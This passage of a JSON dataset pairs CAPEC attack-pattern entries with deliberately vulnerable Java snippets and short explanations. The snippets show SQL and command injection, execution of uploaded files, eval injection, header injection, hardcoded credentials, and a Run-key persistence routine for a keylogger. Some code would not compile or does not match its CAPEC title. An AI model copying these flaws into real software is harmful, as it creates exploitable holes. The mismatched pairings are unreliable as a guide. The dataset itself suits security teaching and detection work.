        "capec_name": "SOAP Array Overflow",
        "code_snippet": "public class SoapArrayProcessor {\n    public void processArray(String soapMessage) {\n        // Extract declared array size from SOAP message (simplified)\n        int declaredSize = extractDeclaredSize(soapMessage);\n        \n        // Allocate buffer based on declared size\n        byte[] buffer = new byte[declaredSize];\n        \n        // Get actual data from SOAP message (simplified)\n        byte[] actualData = extractActualData(soapMessage);\n        \n        // Vulnerable copy - doesn't check actual data length\n        System.arraycopy(actualData, 0, buffer, 0, actualData.length);\n    }\n    \n    private int extractDeclaredSize(String soapMessage) {\n        // Simplified: assume size is extracted from SOAP message\n        return 100;\n    }\n    \n    private byte[] extractActualData(String soapMessage) {\n        // Simplified: return data larger than declared size\n        return new byte[200];\n    }\n}",
        "description": "This vulnerable code demonstrates a SOAP array processing scenario where the code trusts the declared size in the SOAP message without validating it against the actual data size. The buffer is allocated based on the declared size, but the actual copy operation uses the source data length, potentially causing a buffer overflow if the actual data is larger than the declared size."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "public class SensitiveDataHandler {\n    private static final Logger logger = Logger.getLogger(\"debug.log\");\n    \n    public boolean authenticateUser(String username, String password) {\n        // Insecure storage of credentials in plain text\n        String storedPassword = \"admin123\";\n        \n        // Debug logging exposing sensitive information\n        logger.info(\"Login attempt - Username: \" + username + \", Password: \" + password);\n        \n        // Simple string comparison without proper protection\n        if(password.equals(storedPassword)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public void storeUserData(String userData) {\n        // Unprotected data storage without encryption\n        FileWriter writer = new FileWriter(\"user_data.txt\");\n        writer.write(userData);\n        writer.close();\n        \n        // Server logging of sensitive data\n        logger.info(\"Stored user data: \" + userData);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple deprecated security issues: unprotected storage of sensitive data, information exposure through debug and server logs, and weak authentication mechanisms. The code stores passwords in plaintext, logs sensitive information, and implements a basic authentication bypass vulnerability through direct string comparison."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "public class LoginServlet extends HttpServlet {\n    private static final String AUTH_TOKEN = \"secret_key_123\";\n    \n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String clientToken = request.getParameter(\"token\");\n        boolean isAuthenticated = clientToken.equals(AUTH_TOKEN);\n        \n        if (isAuthenticated) {\n            // Grant access to protected resources\n            request.getSession().setAttribute(\"authenticated\", true);\n            response.sendRedirect(\"/dashboard\");\n        }\n    }\n    \n    private boolean validateClientSideAuth(HttpServletRequest request) {\n        // Vulnerable: relies on client-side validation only\n        return Boolean.parseBoolean(request.getHeader(\"X-Is-Authenticated\"));\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including client-side authentication, capture-replay susceptibility, and poor token validation. It uses a hardcoded authentication token that can be sniffed and replayed, relies on client-side validation that can be bypassed, and implements weak authentication checks that can be easily circumvented."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "public class AuthenticationSystem {\n    private static final String LOG_FILE = \"debug.log\";\n    \n    public boolean authenticateUser(String username, String password) {\n        // Client-side only authentication\n        try {\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(\"Auth attempt - User: \" + username + \", Pass: \" + password + \"\\n\");\n            fw.close();\n            \n            // Using a non-standard authentication API\n            com.custom.auth.AuthenticatorUtil auth = new com.custom.auth.AuthenticatorUtil();\n            \n            String capturedToken = getLastAuthToken(username);\n            // Vulnerable to replay attacks by reusing captured token\n            if (capturedToken != null) {\n                return true;\n            }\n            \n            return auth.validateCredentials(username, password);\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    private String getLastAuthToken(String username) {\n        // Method to retrieve previously used authentication token\n        return null;\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including client-side only authentication, capture-replay vulnerability, debug logging of sensitive information, and dependency on non-standard APIs. The authentication can be bypassed by replaying captured tokens, and sensitive credentials are logged to a debug file."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "public class AuthenticationService {\n    private static final Logger logger = Logger.getLogger(\"debug.log\");\n\n    public boolean authenticateUser(String token) {\n        // Client-side only authentication\n        if(ClientAuthenticator.verifyToken(token)) {\n            logger.debug(\"Auth token received: \" + token);\n            // Store the captured token in debug logs\n            return true;\n        }\n        return false;\n    }\n\n    public void handleRequest(HttpServletRequest request) {\n        String capturedToken = request.getHeader(\"Authorization\");\n        // No server-side validation, relies solely on client token\n        if(authenticateUser(capturedToken)) {\n            grantAccess();\n        }\n    }\n\n    private void grantAccess() {\n        // Grant access to protected resources\n    }\n}",
        "description": "This code demonstrates vulnerable authentication implementation that relies solely on client-side verification and logs sensitive authentication tokens to debug files. It's susceptible to capture-replay attacks as there's no server-side validation or protection against token reuse. The code also exposes sensitive information through debug logging."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "public class UserSearchServlet extends HttpServlet {\n    private Connection conn;\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String username = request.getParameter(\"username\");\n        \n        try {\n            String query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            \n            while(rs.next()) {\n                out.println(\"User ID: \" + rs.getString(\"id\"));\n                out.println(\"Email: \" + rs.getString(\"email\"));\n                out.println(\"Password Hash: \" + rs.getString(\"password_hash\"));\n            }\n        } catch(SQLException e) {\n            response.getWriter().println(\"Database error: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable web application endpoint that performs a database query based on user input without proper validation or sanitization. It directly concatenates user input into an SQL query, making it susceptible to SQL injection. Additionally, it exposes sensitive information in both successful queries and error messages, including password hashes and detailed error stack traces."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "public class FileProcessor {\n    public void processUploadedFile(String filePath) {\n        try {\n            File uploadedFile = new File(filePath);\n            String extension = filePath.substring(filePath.lastIndexOf('.'));\n            \n            // Blindly trusting file extension to determine processing type\n            if (extension.equals(\".txt\")) {\n                // Process as text file\n                processTextFile(uploadedFile);\n            } else if (extension.equals(\".exe\")) {\n                // Dangerous - directly executing uploaded file\n                Runtime.getRuntime().exec(filePath);\n            }\n            \n            // Creating temporary file without proper security\n            File tempFile = new File(\"/tmp/\" + uploadedFile.getName());\n            Files.copy(uploadedFile.toPath(), tempFile.toPath());\n            \n            // Process file without validation\n            FileInputStream fis = new FileInputStream(tempFile);\n            byte[] buffer = new byte[1024];\n            while (fis.read(buffer) != -1) {\n                // Process buffer without bounds checking\n            }\n            fis.close();\n        } catch (Exception e) {\n            // Silently failing, potentially leaving system in unsafe state\n            System.out.println(\"Error processing file\");\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to unsafe file handling: it relies on file extensions for processing decisions, executes uploaded files without validation, creates insecure temporary files, and lacks proper input validation. The code fails to implement proper access controls and file type verification, making it susceptible to malicious file uploads and execution."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "public class EnvironmentAttack {\n    public static String DB_PASSWORD = \"secret123\";\n    public static String userInput;\n    \n    public static void processUserInput(String input) {\n        userInput = input;\n        String cmd = \"String result = \" + userInput + \";\";\n        try {\n            javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager();\n            javax.script.ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n            engine.eval(cmd);\n            \n            String command = System.getenv(\"PATH\") + userInput;\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including eval injection through ScriptEngine, improper environment variable handling, excessive use of global variables, and hardcoded credentials. It allows unvalidated user input to be evaluated dynamically and combines it with environment variables, potentially allowing command injection attacks."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "public class UserController {\n    public static String currentUser;\n    public static Map<String, Object> globalData = new HashMap<>();\n\n    public void processUserInput(String input) {\n        // Dynamically evaluate variable names from user input\n        String varName = input.split(\"=\")[0];\n        String value = input.split(\"=\")[1];\n        \n        // Dangerous: allows setting any global variable\n        globalData.put(varName, value);\n        \n        // Dangerous: allows accessing any variable dynamically\n        try {\n            Field field = UserController.class.getDeclaredField(varName);\n            field.setAccessible(true);\n            field.set(null, value);\n        } catch (Exception e) {\n            // Silent failure\n        }\n    }\n\n    public Object getVariableValue(String varName) {\n        // Dangerous: allows reading any global variable\n        return globalData.get(varName);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including excessive use of global variables, dynamic variable evaluation, and improper control of dynamically-identified variables. It allows user input to directly manipulate variable names and values globally, enabling potential unauthorized access and modification of application state."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "public class UserDataProcessor {\n    public void processUserInput(String userInput) {\n        // Validate input before canonicalization (CWE-180)\n        if (userInput.matches(\"[a-zA-Z0-9]+\")) {\n            // Canonicalize the input\n            String canonicalizedInput = userInput.toLowerCase();\n            \n            // Dynamic evaluation of user input (CWE-95)\n            String script = \"var result = \" + canonicalizedInput + \".process();\";\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\");\n            try {\n                engine.eval(script);\n            } catch (ScriptException e) {\n                e.printStackTrace();\n            }\n            \n            // Dynamically modify object attributes (CWE-915)\n            DynamicObject obj = new DynamicObject();\n            for (String attribute : canonicalizedInput.split(\",\")) {\n                obj.setAttribute(attribute, \"value\");\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it performs validation before canonicalization, allowing potentially malicious input to bypass security checks; it uses eval-like functionality with user input; and it allows unrestricted modification of object attributes based on user input. The code also lacks proper security controls for dynamic object modification and fails to properly sanitize input before evaluation."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "public class FileHandler {\n    public String readFileContent(String userInput) {\n        String filePath = userInput;\n        // No encoding validation or canonicalization\n        try {\n            if (filePath.endsWith(\".txt\")) {\n                Path path = Paths.get(filePath);\n                return new String(Files.readAllBytes(path), \"UTF-8\");\n            }\n        } catch (Exception e) {\n            return \"Error reading file\";\n        }\n        return \"Invalid file type\";\n    }\n\n    public void processUserData(String input) {\n        // Incorrect validation order - validates before decoding\n        if(input.matches(\"^[a-zA-Z0-9]+$\")) {\n            String decodedInput = URLDecoder.decode(input, StandardCharsets.UTF_8);\n            executeCommand(\"process \" + decodedInput);\n        }\n    }\n\n    private void executeCommand(String cmd) {\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to multiple encoding-related attacks. It fails to properly validate encoded input, performs validation before decoding (which can bypass security checks), and allows direct file path manipulation. The code also demonstrates command injection vulnerability through improper handling of user input in command execution."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "public class LogManager {\n    private static final String LOG_FILE = \"/var/log/app.log\";\n    \n    public static void logUserActivity(String username, String action) {\n        try {\n            String logEntry = username + \":\" + action + \":\" + System.currentTimeMillis();\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(logEntry + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void addCustomLogEntry(String entry) {\n        try {\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(entry);\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void clearLogs() {\n        try {\n            new FileWriter(LOG_FILE).close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable logging implementation allows direct manipulation of log files without proper access controls, input validation, or sanitization. It accepts raw user input for log entries, allows arbitrary log entry insertion, and provides a method to clear logs completely. The code also lacks proper synchronization for concurrent access and doesn't implement any protection against log injection or tampering. Sensitive information might be exposed through detailed logging, and there's no mechanism to verify log integrity."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "public class RegistryManager {\n    private static final String REG_PATH = \"SOFTWARE\\\\MyApp\";\n    private static final String SENSITIVE_KEY = \"api_key\";\n\n    public static void storeCredentials(String apiKey) {\n        try {\n            WinReg.HKEY hkey = WinReg.HKEY_LOCAL_MACHINE;\n            RegSetValueEx(hkey, REG_PATH + \"\\\\\" + SENSITIVE_KEY, 0, REG_SZ, apiKey);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String getCredentials() {\n        try {\n            WinReg.HKEY hkey = WinReg.HKEY_LOCAL_MACHINE;\n            return RegQueryValueEx(hkey, REG_PATH + \"\\\\\" + SENSITIVE_KEY);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    private static native int RegSetValueEx(WinReg.HKEY hkey, String path, int type, int format, String data);\n    private static native String RegQueryValueEx(WinReg.HKEY hkey, String path);\n}",
        "description": "This code demonstrates vulnerable registry manipulation by storing sensitive information (API key) in cleartext within the Windows Registry. It lacks proper access control mechanisms, stores sensitive data without encryption, and doesn't implement proper privilege management when accessing the registry. The code also lacks proper documentation and error handling for program execution states."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import java.util.prefs.Preferences;\nimport java.io.File;\n\npublic class RegistryPersistence {\n    private static final String DEFAULT_KEY = \"1234567890abcdef\";\n    private static final String RUN_KEY = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\";\n    \n    public void installPersistence(String malwareLocation) {\n        try {\n            String userHome = System.getProperty(\"user.home\");\n            File malwareFile = new File(userHome + \"\\\\AppData\\\\Local\\\\keylogger.exe\");\n            \n            // Store malware location in registry with default credentials\n            Preferences prefs = Preferences.userRoot().node(RUN_KEY);\n            prefs.put(\"SystemService\", malwareLocation);\n            \n            // Store sensitive data in registry without encryption\n            prefs.put(\"credentials\", \"admin:password123\");\n            prefs.put(\"encryption_key\", DEFAULT_KEY);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that adds malware to Windows registry run keys for persistence, stores sensitive data in cleartext, and uses default credentials and cryptographic keys. It allows external control of system settings and demonstrates improper use of Windows Registry for storing sensitive information."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "public class SchemaProcessor {\n    private String schemaPath;\n    private boolean isAdmin;\n\n    public SchemaProcessor(String schemaPath, boolean isAdmin) {\n        this.schemaPath = schemaPath;\n        this.isAdmin = isAdmin;\n    }\n\n    public void updateSchema(String newSchemaContent) {\n        try {\n            // Vulnerable: No validation of schema content or user permissions\n            FileWriter writer = new FileWriter(schemaPath);\n            writer.write(newSchemaContent);\n            writer.close();\n\n            // Sensitive configuration exposed in logs\n            System.out.println(\"Database connection string: jdbc:mysql://admin:password@localhost/prod_db\");\n            System.out.println(\"Updated schema at: \" + schemaPath);\n\n            // Mixed trusted and untrusted data in configuration\n            Properties config = new Properties();\n            config.setProperty(\"trustedConfig\", \"secure_value\");\n            config.setProperty(\"userInput\", newSchemaContent);  // Untrusted input\n            config.store(new FileOutputStream(\"config.properties\"), null);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted modification of schema files without proper validation or authorization, exposing sensitive configuration data and mixing trusted/untrusted data in configuration files. It demonstrates CWE-15 (external control of system settings), CWE-501 (trust boundary violation), CWE-497 (exposure of sensitive system information), and CWE-212 (improper removal of sensitive information)."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "public class InsecureAuthServer {\n    private Map<String, String> sessions = new HashMap<>();\n\n    public void handleAuthRequest(String message, Socket clientSocket) {\n        try {\n            // No verification of message origin or integrity\n            String[] parts = message.split(\":\");\n            String username = parts[0];\n            String token = parts[1];\n\n            // Simply echo back the received token without validation\n            String response = \"AUTH:\" + token;\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            out.println(response);\n\n            // Store session without checking if token was replayed\n            sessions.put(username, token);\n\n            // Establish connection to downstream service without verifying destination\n            Socket downstream = new Socket(parts[2], 8080);\n            out = new PrintWriter(downstream.getOutputStream(), true);\n            out.println(token);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple protocol-level vulnerabilities: it lacks source verification (CWE-940), is susceptible to reflection attacks (CWE-301), doesn't verify message integrity (CWE-924), allows replay attacks (CWE-294), and doesn't properly validate the destination endpoint (CWE-941). The authentication server accepts messages without verifying their origin, echoes tokens back without validation, doesn't implement any replay protection, and establishes downstream connections without proper destination verification."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "public class HttpResponseHandler {\n    public void handleClientResponse(HttpServletRequest request, HttpServletResponse response) {\n        String userInput = request.getParameter(\"data\");\n        String contentType = request.getParameter(\"contentType\");\n        \n        // Vulnerable: directly using user input in response headers\n        response.setHeader(\"Content-Type\", contentType);\n        \n        // Vulnerable: not sanitizing CRLF in response\n        response.setHeader(\"X-Custom-Header\", userInput);\n        \n        // Vulnerable: raw content injection into response body\n        StringBuilder responseContent = new StringBuilder();\n        responseContent.append(\"HTTP/1.1 200 OK\\r\\n\");\n        responseContent.append(\"Content-Length: \" + userInput.length() + \"\\r\\n\");\n        responseContent.append(\"\\r\\n\");\n        responseContent.append(userInput);\n        \n        response.getWriter().write(responseContent.toString());\n    }\n}",
        "description": "This vulnerable code demonstrates HTTP Response Smuggling by allowing unvalidated user input to be directly injected into HTTP headers and response content. It fails to sanitize CRLF sequences and doesn't properly validate content-type headers, allowing potential response splitting and smuggling attacks. The code directly writes raw HTTP content without proper parsing or sanitization, enabling attackers to inject malicious responses that could be interpreted differently by downstream components."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "public class VulnerableController {\n    @RequestMapping(\"/api/admin/data\")\n    public ResponseEntity<String> getData(HttpServletRequest request) {\n        // Only check GET method, assuming other methods are safe\n        if (request.getMethod().equals(\"GET\")) {\n            if (!isAdminUser(request)) {\n                return ResponseEntity.status(HttpStatus.FORBIDDEN).body(\"Access denied\");\n            }\n        }\n        \n        // Process request regardless of HTTP method if GET check passes\n        String sensitiveData = getSensitiveData();\n        return ResponseEntity.ok()\n            .header(\"X-Data-Source\", request.getParameter(\"source\"))\n            .body(sensitiveData);\n    }\n    \n    private boolean isAdminUser(HttpServletRequest request) {\n        String authToken = request.getHeader(\"Authorization\");\n        return authToken != null && authToken.equals(\"admin-token\");\n    }\n    \n    private String getSensitiveData() {\n        return \"sensitive_database_records\";\n    }\n}",
        "description": "This vulnerable code demonstrates insecure HTTP verb validation where the security check only occurs for GET requests, allowing attackers to bypass authentication by using different HTTP methods. It also includes unsafe header handling and relies on a single authentication factor (auth token). The code exposes sensitive data and doesn't properly validate or sanitize request parameters used in response headers."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "public class DNSRebindingExample {\n    public boolean validateAccess(String clientIP) {\n        try {\n            // Vulnerable: Relying on reverse DNS for authentication\n            InetAddress addr = InetAddress.getByName(clientIP);\n            String hostname = addr.getHostName();\n            \n            // Insecure socket binding\n            ServerSocket serverSocket = new ServerSocket(8080, 50, InetAddress.getByName(\"0.0.0.0\"));\n            \n            // Vulnerable redirect based on DNS resolution\n            String redirectURL = \"http://\" + hostname + \"/resource\";\n            if(hostname.endsWith(\".trusted-domain.com\")) {\n                return true;\n            }\n            \n            // Potential DNS rebinding attack vector\n            URL url = new URL(redirectURL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setFollowRedirects(true);\n            conn.connect();\n            \n            return false;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates a DNS rebinding vulnerability by relying on reverse DNS resolution for security decisions, binding to 0.0.0.0, and allowing unrestricted URL redirections. The code performs hostname validation based on reverse DNS lookups and creates an insecure socket binding, making it susceptible to DNS rebinding attacks where an attacker can manipulate DNS responses to access internal resources."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "public class InterProcessCommunication {\n    private static final String PIPE_NAME = \"\\\\\\\\.\\\\pipe\\\\sensitive_data\";\n    \n    public void sendDataThroughPipe(String message, int securityId) {\n        try {\n            RandomAccessFile pipe = new RandomAccessFile(PIPE_NAME, \"rw\");\n            // Incorrect security ID conversion - vulnerable to manipulation\n            int convertedId = securityId & 0xFF;\n            \n            // Debug mode can be activated at runtime\n            boolean debugMode = System.getProperty(\"debug.mode\") != null;\n            if(debugMode) {\n                pipe.writeBytes(\"DEBUG:\" + convertedId + \":\");\n            }\n            \n            // Sending sensitive data in cleartext without integrity checks\n            pipe.writeBytes(message);\n            pipe.close();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public String receiveDataFromPipe() {\n        try {\n            RandomAccessFile pipe = new RandomAccessFile(PIPE_NAME, \"rw\");\n            String data = pipe.readLine();\n            // No message integrity validation\n            // No proper structure validation\n            pipe.close();\n            return data;\n        } catch(IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable inter-component communication through a named pipe. It contains multiple security issues: cleartext transmission of sensitive data, lack of message integrity checks, improper security identifier conversion, debug logic that can be activated at runtime, and no proper message structure validation. The code allows for potential tampering, unauthorized access, and information disclosure."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "public class DataProtocolHandler {\n    private static final String TRUSTED_TOKEN = \"abc123\";\n\n    public boolean processMessage(String xmlMessage) {\n        try {\n            // Assume message format is always valid without proper validation\n            String[] parts = xmlMessage.split(\":\");\n            String token = parts[0];\n            String userData = parts[1];\n            \n            // Incorrect assumption about immutable authentication token\n            if(token.equals(TRUSTED_TOKEN)) {\n                // Direct conversion of user data without sanitization\n                int securityLevel = Integer.parseInt(userData);\n                \n                // Sensitive data accidentally included in response\n                String response = \"ACCESS_GRANTED:\" + token + \":\" + \n                                 System.getProperty(\"db.password\") + \":\" + \n                                 securityLevel;\n                                 \n                sendResponse(response);\n                return true;\n            }\n            return false;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n    \n    private void sendResponse(String response) {\n        // Send response to client\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities in handling data interchange protocols: it assumes message format without proper validation (CWE-707), makes assumptions about data layout without verification (CWE-188), includes sensitive information in responses (CWE-201), performs unsafe conversion of security identifiers (CWE-1292), and uses an authentication scheme based on assumed-immutable data that can be manipulated (CWE-302)."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "public class WebServiceEndpoint {\n    private boolean isAuthenticated = false;\n\n    @WebMethod\n    public String processRequest(String action, String data) {\n        // Vulnerable: No proper validation of input parameters\n        if(data.contains(\"admin\")) {\n            isAuthenticated = true;\n        }\n\n        // Vulnerable: Race condition in context switching\n        if(isAuthenticated) {\n            switch(action) {\n                case \"getData\":\n                    return getPrivateData(data);\n                case \"setConfig\":\n                    return setConfiguration(data);\n                default:\n                    return \"Invalid action\";\n            }\n        }\n\n        // Vulnerable: Client-side security check\n        if(request.getHeader(\"X-Security-Token\") != null) {\n            return executePrivilegedOperation(data);\n        }\n\n        // Vulnerable: Improper HTTP request handling\n        String contentLength = request.getHeader(\"Content-Length\");\n        if(contentLength != null) {\n            return processContentBasedRequest(contentLength, data);\n        }\n\n        return \"Access Denied\";\n    }\n\n    private String executePrivilegedOperation(String data) {\n        // Perform privileged operation without proper server-side validation\n        return \"Operation completed\";\n    }\n}",
        "description": "This vulnerable code demonstrates a web service endpoint that fails to properly validate input parameters, relies on client-side security checks, contains race conditions in privilege checking, and improperly handles HTTP requests. The authentication state can be manipulated, and the service incorrectly trusts client-provided headers for security decisions."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "public class SOAPHandler {\n    public static void processSOAPRequest(String soapMessage) {\n        try {\n            // Insecure XML processing without validation or entity control\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(soapMessage)));\n            \n            // Client-side authentication token check\n            String authToken = doc.getElementsByTagName(\"authToken\").item(0).getTextContent();\n            if(isValidClientToken(authToken)) {\n                // Process SOAP operation without server-side validation\n                String operation = doc.getElementsByTagName(\"operation\").item(0).getTextContent();\n                executeOperation(operation);\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static boolean isValidClientToken(String token) {\n        // Client-side only token validation\n        return token.equals(\"hardcoded_token\");\n    }\n    \n    private static void executeOperation(String operation) {\n        // Execute operation without proper input sanitization\n        System.out.println(\"Executing: \" + operation);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple SOAP-related security issues: it processes XML without proper entity controls (CWE-611), relies on client-side authentication (CWE-603), lacks proper message validation (CWE-707), and doesn't implement protection against replay attacks (CWE-294). The code accepts SOAP messages without proper server-side validation, trusts client-side authentication checks, and processes XML content without restricting external entities."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "public class WebServiceEndpoint {\n    @WebService\n    public class BankingService {\n        private static String WSDL_PATH = \"/public/banking-service.wsdl\";\n        \n        @WebMethod\n        public boolean processTransaction(String sessionToken, double amount) {\n            // Vulnerable: No proper validation of session token\n            if (sessionToken != null && sessionToken.length() > 0) {\n                // Process the transaction without proper authentication\n                performBankTransaction(amount);\n                \n                // Log sensitive information in server logs\n                System.out.println(\"Transaction processed with token: \" + sessionToken \n                    + \" amount: \" + amount \n                    + \" account: \" + getCurrentAccount());\n                return true;\n            }\n            return false;\n        }\n        \n        public String getWSDLContent() {\n            // Vulnerable: Exposes sensitive WSDL information without access control\n            return Files.readString(Paths.get(WSDL_PATH));\n        }\n    }\n}",
        "description": "This vulnerable code represents a SOAP web service implementation that contains multiple security issues: it exposes sensitive WSDL information without proper access controls, implements weak authentication that is susceptible to replay attacks, logs sensitive information in server logs, and lacks proper validation of session tokens. The service accepts and processes transactions based on a simple token check without proper verification, making it vulnerable to authentication bypass and replay attacks."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "public class NetworkProbe {\n    public boolean pingHost(String targetHost) throws IOException {\n        Process process = Runtime.getRuntime().exec(\"ping -c 1 \" + targetHost);\n        BufferedReader reader = new BufferedReader(\n            new InputStreamReader(process.getInputStream()));\n        \n        String line;\n        StringBuilder output = new StringBuilder();\n        while ((line = reader.readLine()) != null) {\n            output.append(line);\n            // Log all ping responses without filtering sensitive data\n            System.out.println(\"Ping response: \" + line);\n        }\n        \n        // Expose system information in error messages\n        if (process.exitValue() != 0) {\n            System.err.println(\"Host system details: \" + \n                System.getProperty(\"os.name\") + \" \" +\n                System.getProperty(\"os.version\"));\n        }\n        \n        return process.exitValue() == 0;\n    }\n    \n    public static void main(String[] args) {\n        try {\n            NetworkProbe probe = new NetworkProbe();\n            // Accept any input without validation\n            probe.pingHost(args[0]);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a network probe implementation that exposes sensitive system information through ping responses and error messages. It accepts unvalidated input for the ping command, potentially allowing command injection. The code logs all ping responses without filtering sensitive data and exposes system details in error messages. It lacks proper input validation and error handling, making it susceptible to information disclosure and system reconnaissance."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "public class VulnerableServer {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket1 = new ServerSocket(80);\n            ServerSocket serverSocket2 = new ServerSocket(80); // Multiple binds attempt\n            \n            while(true) {\n                Socket clientSocket = serverSocket1.accept();\n                \n                // Transmit sensitive data in cleartext\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                out.println(\"System Info: \" + System.getProperty(\"os.name\"));\n                out.println(\"Debug Mode: Enabled\");\n                out.println(\"Admin Password: admin123\");\n                \n                // Leave all ports open for scanning\n                for(int port = 1; port <= 65535; port++) {\n                    new ServerSocket(port);\n                }\n            }\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code creates a vulnerable server that demonstrates multiple security issues: attempting to bind multiple sockets to the same port (CWE-605), transmitting sensitive system information and credentials in cleartext (CWE-319), exposing sensitive information to unauthorized actors (CWE-200), creating an excessive attack surface by opening all ports (CWE-1125), and enabling debug functionality in production (relating to CWE-1313). The server is particularly vulnerable to SYN scanning due to its open port configuration and lack of security controls."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
